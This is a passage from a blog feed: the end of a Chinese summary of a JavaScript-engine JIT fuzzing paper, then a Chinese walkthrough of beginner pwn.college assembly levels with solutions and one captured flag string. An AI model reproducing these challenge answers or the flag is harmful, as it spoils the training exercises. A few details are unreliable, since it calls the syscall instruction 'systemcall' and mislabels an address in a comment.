编译如何导致严重的漏洞，以及为什么当前的模糊测试方法不足以检测到此类漏洞。 我们建议通过我们生成语义上正确的代码的新方法来填补这个模糊测试空白，利用具有一定比例的 JIT 聚焦突变策略的 IR。 我们用 swift 编程语言实现了我们的方法，并在 500 个内核上针对 V8、SpiderMonkey 和 JavaScriptCore 进行了为期 6 个月的实验。 在此测试时间范围内，我们发现了 17 个先前未知的漏洞。 这些漏洞平均至少有 16 个月历史，因此也被各自供应商和研究人员的模糊器所忽视。 为了促进研究和加强 JS 引擎的安全性，我们将开源我们的代码。</p><p>我们还对我们的模糊器进行了描述性和经验性分析。 在我们的描述性分析中，我们展示了我们的模糊器如何在不同的引擎中很好地泛化，并且能够找到先前未知的漏洞，从而展示了其对最新技术的定性改进。 我们的经验分析表明，我们的模糊器部署了恒定但有限的突变焦点来关注 JIT。 此外，经验分析表明，即使向 Superion 提供全面的启动语料库，我们也能在 JIT 聚焦模糊测试方面优于或与最新的模糊器 Superion 竞争。 当减少启动语料库时，Superion 无法在三个引擎的通用覆盖率或 JIT 聚焦覆盖率方面超越我们。 这些结果强调了跨多个不同语料库测试利用输入语料库的模糊器的重要性，以判断其通用性。 我们还呼吁所有未来的模糊测试研究不仅需要发布源代码，还需要发布使用的评估语料库。</p><p>然而，我们的模糊测试方法并不完整，因为仍然有改进类型信息的空间，<strong>例如通过检测发出的代码使其更加精确</strong>，这将允许更具针对性的代码生成。 此外，我们的突变集是有限的。 增加突变集以包含对控制流的聚焦突变可能会产生更深层隐藏的漏洞。 此外，还可以增加特殊功能的集合，因为 JavaScript 是一种复杂且功能丰富的语言，不太受欢迎的功能可能包含尚未发现的问题。</p>]]></content>
    
    
    <categories>
      
      <category>Paper</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Paper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn.college 题解</title>
    <link href="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Computing-101"><a href="#Computing-101" class="headerlink" title="Computing 101"></a>Computing 101</h2><h3 id="Your-First-Program"><a href="#Your-First-Program" class="headerlink" title="Your First Program"></a>Your First Program</h3><h4 id="1-Your-First-Register"><a href="#1-Your-First-Register" class="headerlink" title="1. Your First Register"></a>1. Your First Register</h4><p>这道题的要求是讲值60移动到<code>rax</code>寄存器中。并将汇编代码放进某个.s文件中</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x3c</span><br></code></pre></td></tr></table></figure><p>比较简单</p><h4 id="2-Your-First-Syscall"><a href="#2-Your-First-Syscall" class="headerlink" title="2. Your First Syscall"></a>2. Your First Syscall</h4><p>这道题通过将系统调用号为60传给eax，并执行系统调用指令<code>systemcall</code>，来调用exit</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="3-Exit-Codes"><a href="#3-Exit-Codes" class="headerlink" title="3. Exit Codes"></a>3. Exit Codes</h4><p>依然是调用指令，但是退出代码要求为42。42作为参数，那么系统调用的第一个参数通过rdi寄存器传递。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="4-Building-Executables"><a href="#4-Building-Executables" class="headerlink" title="4. Building Executables"></a>4. Building Executables</h4><p>要构建可执行二进制文件，步骤如下：</p><ol><li>将程序集写入文件（通常带有.s或.S语法）</li><li>将二进制文件汇编到可执行对象文件中（使用as命令）</li><li>将一个或多个可执行对象文件链接到最终的可执行二进制文件中（使用ld命令）</li></ol><p>使用Intel汇编语法，要让汇编者知道这一点。为此，再汇编代码的开头加上一个指令，如下所示（以上一个level的代码为例）。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><p><code>.intel_syntax noprefix</code>会告诉汇编器使用Intel汇编语法，特别是它的变体，从而不必为每个指令添加额外的前缀。</p><p>接下来分别使用as命令和ld命令来构建可执行二进制文件</p><p><code>as -o asm.o asm.s</code> 和 <code>ld -o exe asm.o</code>这将创建一个exe文件，随后可以运行该文件。</p><blockquote><p>ld命令：link editor</p><p>在典型的开发工作流程中，编译源代码并将汇编代码汇编成目标文件，通常有很多这样的文件（通常，程序中的每个源代码文件都编译成自己的目标文件）。然后，这些内容将<strong>链接</strong>在一起，形成一个可执行文件。即使只有一个文件我们仍然需要链接它，以准备最终的可执行文件。这是通过ld命令完成的。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">hacker@your-first-program~<span class="hljs-keyword">exit</span>-codes:~$ as -o hello.o hello.s<br>hacker@your-first-program~<span class="hljs-keyword">exit</span>-codes:~$ ld -o exe hello.o<br><span class="hljs-regexp">/nix/</span>store<span class="hljs-regexp">/q3sm4x963a996qc3d6baw54609ryifak-binutils-2.41/</span>bin/ld: warning: cannot find entry symbol _start; defaulting to <span class="hljs-number">0000000000401000</span><br></code></pre></td></tr></table></figure><p>这里会有一个<code>_start</code>警告，这是因为ld会打印有关输入符号<code>_start</code>的警告。<code>_start</code>符号本质上是给ld的注释，说明在执行ELF时程序执行应该从何处开始。该警告指出，如果没有指定的<code>_start</code>，执行将从代码的开头开始。这对我们来说很好！</p><p>如果不希望出现这个警告，那么可以修改成：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><p>第二个<code>_start</code>标签指向代码的开头，第一个<code>.global _start</code>指示这个标签在链接器级别<strong>全局可见</strong>，而不仅仅是在对象文件级别本地可见。</p><h4 id="5-Tracing-Syscalls"><a href="#5-Tracing-Syscalls" class="headerlink" title="5. Tracing Syscalls"></a>5. Tracing Syscalls</h4><p>调试程序的工具和技术：<strong>strace</strong></p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@dojo:~$ strace /tmp/your-program<br>execve(<span class="hljs-string">&quot;/tmp/your-program&quot;</span>, [<span class="hljs-string">&quot;/tmp/your-program&quot;</span>], 0x7ffd48ae28b0 /* 53 vars */) = 0<br><span class="hljs-built_in">exit</span>(42)                                 = ?<br>+++ exited with 42 +++<br>hacker@dojo:~$<br></code></pre></td></tr></table></figure><p>这道题的exp:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">hacker@your-first-program~tracing-syscalls:~$ strace <span class="hljs-regexp">/challenge/</span>trace-me <br>execve(<span class="hljs-string">&quot;/challenge/trace-me&quot;</span>, [<span class="hljs-string">&quot;/challenge/trace-me&quot;</span>], <span class="hljs-number">0</span>x7ffc5d085500 <span class="hljs-regexp">/* 26 vars */</span>) = <span class="hljs-number">0</span><br>alarm(<span class="hljs-number">6398</span>)                             = <span class="hljs-number">0</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)                                 = ?<br>+++ exited with <span class="hljs-number">0</span> +++<br>hacker@your-first-program~tracing-syscalls:~$ <span class="hljs-regexp">/challenge/</span>submit-number <span class="hljs-number">6398</span><br>CORRECT! Here is your flag:<br>pwn.college&#123;wHIzj1noGySkn_Bsyfc41LKkCc3.dFzN4UDLxYTN1YzW&#125;<br></code></pre></td></tr></table></figure><h4 id="6-Moving-Between-Registers"><a href="#6-Moving-Between-Registers" class="headerlink" title="6. Moving Between Registers"></a>6. Moving Between Registers</h4><p><code>rsi</code>寄存器，像<code>rdi</code>寄存器一样能存东西。</p><p>这道题要将rsi的值作为exit系统调用的代码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h3 id="Computer-Memory"><a href="#Computer-Memory" class="headerlink" title="Computer Memory"></a>Computer Memory</h3><h4 id="1-Loading-From-Memory"><a href="#1-Loading-From-Memory" class="headerlink" title="1. Loading From Memory"></a>1. Loading From Memory</h4><p>从内存中加载数据</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-number">133700</span>]# 从内存[<span class="hljs-number">0x133700</span>]处获得数据，存于<span class="hljs-built_in">rdi</span>寄存器中<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="2-More-Loading-Practice"><a href="#2-More-Loading-Practice" class="headerlink" title="2. More Loading Practice"></a>2. More Loading Practice</h4><p>同样的从内存中加载数据</p><h4 id="3-Dereferencing-Pointers"><a href="#3-Dereferencing-Pointers" class="headerlink" title="3. Dereferencing Pointers"></a>3. Dereferencing Pointers</h4><p>rax解引用，将rax存储的地址取出，并将这个地址所指向的值赋予rdi寄存器</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="4-Dereferencing-Yourself"><a href="#4-Dereferencing-Yourself" class="headerlink" title="4. Dereferencing Yourself"></a>4. Dereferencing Yourself</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="5-Dereferencing-with-Offsets"><a href="#5-Dereferencing-with-Offsets" class="headerlink" title="5. Dereferencing with Offsets"></a>5. Dereferencing with Offsets</h4><p>说明：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">  Address │ Contents<br>+────────────────────+<br>│<span class="hljs-number"> 133700 </span> │<span class="hljs-number"> 50 </span>      │◂┐<br>│<span class="hljs-number"> 133701 </span> │<span class="hljs-number"> 42 </span>      │ │<br>│<span class="hljs-number"> 133702 </span> │<span class="hljs-number"> 99 </span>      │ │<br>│<span class="hljs-number"> 133703 </span> │<span class="hljs-number"> 14 </span>      │ │<br>+────────────────────+ │<br>                       │<br> Register │ Contents   │<br>+────────────────────+ │<br>│ rdi     │<span class="hljs-number"> 133700 </span>  │─┘<br>+────────────────────+<br></code></pre></td></tr></table></figure><p>如果我想获取42这个数字，那么可以：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p>最终的exp：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="6-Stored-Address"><a href="#6-Stored-Address" class="headerlink" title="6. Stored Address"></a>6. Stored Address</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-number">567800</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="7-Double-Dereference"><a href="#7-Double-Dereference" class="headerlink" title="7. Double Dereference"></a>7. Double Dereference</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="8-Triple-Dereference"><a href="#8-Triple-Dereference" class="headerlink" title="8. Triple Dereference"></a>8. Triple Dereference</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h3 id="Hello-Hackers"><a href="#Hello-Hackers" class="headerlink" title="Hello Hackers"></a>Hello Hackers</h3><h4 id="1-Writing-Output"><a href="#1-Writing-Output" class="headerlink" title="1. Writing Output"></a>1. Writing Output</h4><p><code>write</code>系统调用的<code>syscall</code>编号为1。但是write系统调用还需要通过其参数指定要写入的数据以及将其写入的位置。</p><p><code>write</code>系统调用通过获取两个参数，即分别代表开始写入和要写入多少个字符。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">write</span><span class="hljs-params">(file_descriptor, memory_address, number_of_characters_to_write)</span></span><br></code></pre></td></tr></table></figure><p>其中，rdi寄存器传递系统调用的第一个参数。<strong>rsi寄存器传递第二个参数，rdx寄存器传递第三个参数。</strong></p><p>exp:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="2-Chaining-Syscalls"><a href="#2-Chaining-Syscalls" class="headerlink" title="2. Chaining Syscalls"></a>2. Chaining Syscalls</h4><p>正确退出</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="3-Writing-Strings"><a href="#3-Writing-Strings" class="headerlink" title="3. Writing Strings"></a>3. Writing Strings</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">14</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="4-Reading-Data"><a href="#4-Reading-Data" class="headerlink" title="4. Reading Data"></a>4. Reading Data</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">8</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">8</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h3 id="Assembly-Crash-Course"><a href="#Assembly-Crash-Course" class="headerlink" title="Assembly Crash Course"></a>Assembly Crash Course</h3><h4 id="1-set-register"><a href="#1-set-register" class="headerlink" title="1. set-register"></a>1. set-register</h4><p>要求：<code>rdi = 0x1337</code></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0x1337</span><br></code></pre></td></tr></table></figure><h4 id="2-set-multiple-registers"><a href="#2-set-multiple-registers" class="headerlink" title="2. set-multiple-registers"></a>2. set-multiple-registers</h4><p>In this level, you will work with multiple registers. Please set the following:</p><ul><li><code>rax = 0x1337</code></li><li><code>r12 = 0xCAFED00D1337BEEF</code></li><li><code>rsp = 0x31337</code></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x1337</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r12</span>, <span class="hljs-number">0xCAFED00D1337BEEF</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x31337</span><br></code></pre></td></tr></table></figure><h4 id="3-add-to-register"><a href="#3-add-to-register" class="headerlink" title="3. add-to-register"></a>3. add-to-register</h4><p>Do the following:</p><ul><li>Add <code>0x331337</code> to <code>rdi</code></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0x331337</span><br></code></pre></td></tr></table></figure><h4 id="4-linear-equation-registers"><a href="#4-linear-equation-registers" class="headerlink" title="4. linear-equation-registers"></a>4. linear-equation-registers</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">imul</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br><br></code></pre></td></tr></table></figure><h4 id="5-integer-division"><a href="#5-integer-division" class="headerlink" title="5. integer-division"></a>5. integer-division</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">div</span> <span class="hljs-built_in">rsi</span><br></code></pre></td></tr></table></figure><h4 id="6-modulo-operation"><a href="#6-modulo-operation" class="headerlink" title="6. modulo-operation"></a>6. modulo-operation</h4><p>div操作之后，余数会被存于rdx(dx)中。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">div</span> <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br></code></pre></td></tr></table></figure><h4 id="7-set-upper-byte"><a href="#7-set-upper-byte" class="headerlink" title="7. set-upper-byte"></a>7. 